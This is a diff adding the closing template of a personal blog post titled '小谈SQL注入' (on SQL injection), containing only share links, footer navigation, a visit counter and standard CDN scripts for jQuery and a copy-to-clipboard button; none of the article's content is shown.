+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&title=小谈SQL注入"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&is_video=false&description=小谈SQL注入"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=小谈SQL注入&body=Check out this article: http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&title=小谈SQL注入"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&title=小谈SQL注入"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&title=小谈SQL注入"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&title=小谈SQL注入"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&name=小谈SQL注入&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&t=小谈SQL注入"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021
+    Du1L0v3
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
+        
+         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+         <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.2/css/all.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.bootcdn.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
